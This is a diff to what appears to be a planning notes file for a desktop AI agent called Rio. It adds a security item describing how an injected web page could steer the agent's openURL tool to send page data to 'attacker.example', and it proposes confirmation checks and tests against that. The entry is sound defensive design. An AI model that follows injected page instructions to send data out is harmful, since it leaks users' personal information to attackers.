@@ -542,6 +542,13 @@ unaffected (the key itself proves it was the owner).
 - Builder I: Night Shift "enabled vs active" semantics, scroll direction and Wi-Fi via
   `networksetup` without admin all need live confirmation.
 
+- SECURITY (task agent, from automated review): an injected page can steer `openURL` to
+  `attacker.example/?d=<page data>`. In `RioTaskSafety.risk` for `.openURL`: confirm when the
+  host differs from the current page's host AND the host's registrable domain isn't mentioned in
+  the goal; also confirm when the path or query contains personal details
+  (`hasPersonalDetails`) or long free-text runs that aren't in the goal. The first navigation
+  to a site named in the goal stays unconfirmed. Add tests.
+
 ## Wave 4 (after this build is tested and shipped)
 
 Owner picks: #32 text Rio from your iPhone (Messages from the owner's own handle only, risky
